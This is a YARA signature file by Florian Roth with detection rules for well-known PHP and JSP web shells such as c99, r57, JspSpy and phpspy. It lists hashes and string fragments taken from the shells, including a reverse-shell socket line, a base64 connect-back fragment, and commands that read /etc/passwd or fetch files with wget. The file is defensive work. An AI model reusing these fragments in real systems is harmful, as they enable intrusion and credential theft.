rule webshell_2_520_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "532b93e02cddfbb548ce5938fe2f5559"
		hash4 = "6e0fa491d620d4af4b67bae9162844ae"
		hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
		$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
	condition:
		all of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_JspSpy_JspSpyJDK5_JspSpyJDK51_luci_jsp_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, t00ls.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "9c94637f76e68487fa33f7b0030dd932"
		hash23 = "6acc82544be056580c3a1caaa4999956"
		hash24 = "6aa32a6392840e161a018f3907a86968"
		hash25 = "591ca89a25f06cf01e4345f98a22845c"
		hash26 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash27 = "3ea688e3439a1f56b16694667938316d"
		hash28 = "ab77e4d1006259d7cbc15884416ca88c"
		hash29 = "71097537a91fac6b01f46f66ee2d7749"
		hash30 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash31 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s0 = "ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";" fullword
		$s1 = "private static class VEditPropertyInvoker extends DefaultInvoker {" fullword
	condition:
		all of them
}
rule webshell_wso2_5_1_wso2_5_wso2 {
	meta:
		description = "Web Shell - from files wso2.5.1.php, wso2.5.php, wso2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "dbeecd555a2ef80615f0894027ad75dc"
		hash1 = "7c8e5d31aad28eb1f0a9a53145551e05"
		hash2 = "cbc44fb78220958f81b739b493024688"
	strings:
		$s7 = "$opt_charsets .= '<option value=\"'.$item.'\" '.($_POST['charset']==$item?'selec"
		$s8 = ".'</td><td><a href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['na"
	condition:
		all of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010_t00ls {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp, t00ls.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
		hash5 = "9c94637f76e68487fa33f7b0030dd932"
	strings:
		$s8 = "table.append(\"<td nowrap> <a href=\\\"#\\\" onclick=\\\"view('\"+tbName+\"')"
		$s9 = "\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\""
	condition:
		all of them
}
rule webshell_404_data_suiyue {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, suiyue.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
	strings:
		$s3 = " sbCopy.append(\"<input type=button name=goback value=' \"+strBack[languageNo]+"
	condition:
		all of them
}
rule webshell_r57shell_r57shell127_SnIpEr_SA_Shell_EgY_SpIdEr_ShElL_V2_r57_xxx {
	meta:
		description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "513b7be8bd0595c377283a7c87b44b2e"
		hash5 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash6 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash7 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash8 = "41af6fd253648885c7ad2ed524e0692d"
		hash9 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s2 = "echo sr(15,\"<b>\".$lang[$language.'_text58'].$arrow.\"</b>\",in('text','mk_name"
		$s3 = "echo sr(15,\"<b>\".$lang[$language.'_text21'].$arrow.\"</b>\",in('checkbox','nf1"
		$s9 = "echo sr(40,\"<b>\".$lang[$language.'_text26'].$arrow.\"</b>\",\"<select size="
	condition:
		all of them
}
rule webshell_807_a_css_dm_he1p_JspSpy_xxx {
	meta:
		description = "Web Shell - from files 807.jsp, a.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, nogfw.jsp, ok.jsp, style.jsp, u.jsp, xia.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash2 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash3 = "14e9688c86b454ed48171a9d4f48ace8"
		hash4 = "b330a6c2d49124ef0729539761d6ef0b"
		hash5 = "d71716df5042880ef84427acee8b121e"
		hash6 = "341298482cf90febebb8616426080d1d"
		hash7 = "29aebe333d6332f0ebc2258def94d57e"
		hash8 = "42654af68e5d4ea217e6ece5389eb302"
		hash9 = "88fc87e7c58249a398efd5ceae636073"
		hash10 = "4a812678308475c64132a9b56254edbc"
		hash11 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash12 = "344f9073576a066142b2023629539ebd"
		hash13 = "32dea47d9c13f9000c4c807561341bee"
		hash14 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash15 = "6acc82544be056580c3a1caaa4999956"
		hash16 = "6aa32a6392840e161a018f3907a86968"
		hash17 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash18 = "3ea688e3439a1f56b16694667938316d"
		hash19 = "ab77e4d1006259d7cbc15884416ca88c"
		hash20 = "71097537a91fac6b01f46f66ee2d7749"
		hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash22 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
		$s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
		$s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
	condition:
		all of them
}
rule webshell_201_3_ma_download {
	meta:
		description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a7e25b8ac605753ed0c438db93f6c498"
		hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
		$s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
		$s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
	condition:
		all of them
}
rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "36331f2c81bad763528d0ae00edf55be"
		hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash5 = "8979594423b68489024447474d113894"
		hash6 = "ec482fc969d182e5440521c913bab9bd"
		hash7 = "f98d2b33cd777e160d1489afed96de39"
		hash8 = "4b4c12b3002fad88ca6346a873855209"
		hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash10 = "e9a5280f77537e23da2545306f6a19ad"
		hash11 = "598eef7544935cf2139d1eada4375bb5"
		hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
		$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
	condition:
		all of them
}
rule webshell_shell_phpspy_2006_arabicspy {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
	strings:
		$s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
		$s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
	condition:
		all of them
}
rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
	meta:
		description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash1 = "8979594423b68489024447474d113894"
		hash2 = "ec482fc969d182e5440521c913bab9bd"
		hash3 = "f98d2b33cd777e160d1489afed96de39"
		hash4 = "4b4c12b3002fad88ca6346a873855209"
		hash5 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
		$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
	condition:
		all of them
}
rule webshell_2_520_icesword_job_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
		$s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
		$s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
	condition:
		all of them
}
rule webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
		$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
		$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
	condition:
		2 of them
}
rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
	condition:
		all of them
}
rule webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files c99.php, Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "f2fa878de03732fbf5c86d656467ff50"
		hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash5 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
	condition:
		all of them
}
rule webshell_2008_2009lite_2009mssql {
	meta:
		description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "3f4d454d27ecc0013e783ed921eeecde"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
	strings:
		$s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
		$s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
	condition:
		all of them
}
rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash2 = "42f211cec8032eb0881e87ebdb3d7224"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "0712e3dc262b4e1f98ed25760b206836"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
		$s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
	condition:
		all of them
}
rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
	meta:
		description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash1 = "14e9688c86b454ed48171a9d4f48ace8"
		hash2 = "341298482cf90febebb8616426080d1d"
		hash3 = "88fc87e7c58249a398efd5ceae636073"
		hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
	strings:
		$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
		$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
	condition:
		1 of them
}
rule webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
	meta:
		description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
		hash1 = "f8a6d5306fb37414c5c772315a27832f"
		hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"
	strings:
		$s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
		$s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
	condition:
		all of them
}
rule webshell_404_data_in_JFolder_jfolder01_xxx {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "4b4c12b3002fad88ca6346a873855209"
		hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash8 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
	condition:
		all of them
}
rule webshell_jsp_reverse_jsp_reverse_jspbd {
	meta:
		description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
		hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
		hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"
		score2 = 50
	strings:
		$s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
		$s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
		$s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
	condition:
		all of them
}
rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
	meta:
		description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "36331f2c81bad763528d0ae00edf55be"
		hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash2 = "8979594423b68489024447474d113894"
		hash3 = "ec482fc969d182e5440521c913bab9bd"
		hash4 = "f98d2b33cd777e160d1489afed96de39"
		hash5 = "4b4c12b3002fad88ca6346a873855209"
		hash6 = "e9a5280f77537e23da2545306f6a19ad"
		hash7 = "598eef7544935cf2139d1eada4375bb5"
	strings:
		$s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
		$s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
		$s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
		$s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
	condition:
		2 of them
}
rule webshell_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "40a1f840111996ff7200d18968e42cfe"
		hash2 = "e0202adff532b28ef1ba206cf95962f2"
		hash3 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "    $new_offset        = strlen(implode('', $this->datasec));" fullword
		$s6 = "        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);" fullword
		$s8 = "        pack('v', sizeof($this -> ctrl_dir)) ." fullword
		$s9 = "    $dtime    = dechex($this->unix2DosTime($time));" fullword
	condition:
		2 of them
}
rule webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "56c005690da2558690c4aa305a31ad37"
		hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
		hash5 = "6e0fa491d620d4af4b67bae9162844ae"
		hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
	strings:
		$s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
		$s6 = "password = (String)session.getAttribute(\"password\");" fullword
		$s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
	condition:
		2 of them
}
rule webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files shell.php, 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "791708057d8b429d91357d38edf43cc0"
		hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash4 = "40a1f840111996ff7200d18968e42cfe"
		hash5 = "e0202adff532b28ef1ba206cf95962f2"
		hash6 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
		$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
		$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
		$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
	condition:
		2 of them
}
rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
	meta:
		description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
		hash1 = "ef43fef943e9df90ddb6257950b3538f"
		hash2 = "ae025c886fbe7f9ed159f49593674832"
		hash3 = "911195a9b7c010f61b66439d9048f400"
		hash4 = "697dae78c040150daff7db751fc0c03c"
		hash5 = "513b7be8bd0595c377283a7c87b44b2e"
		hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
	condition:
		all of them
}
rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
	meta:
		description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "8ae9d2b50dc382f0571cd7492f079836"
		hash1 = "e2830d3286001d1455479849aacbbb38"
		hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
		hash3 = "40c6ecf77253e805ace85f119fe1cebb"
	strings:
		$s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
		$s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
		$s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
	condition:
		2 of them
}
rule webshell_Shell_ci_Biz_was_here_c100_v_xxx {
	meta:
		description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "f2fa878de03732fbf5c86d656467ff50"
		hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
	strings:
		$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
		$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
		$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
		$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
		$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "f3ca29b7999643507081caab926e2e74"
		hash2 = "527cf81f9272919bf872007e21c4bdda"
	strings:
		$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
		$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
		$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
		$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_w4cking_Shell_xxx {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, acid.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "9c34adbc8fd8d908cbb341734830f971"
		hash3 = "f2fa878de03732fbf5c86d656467ff50"
		hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
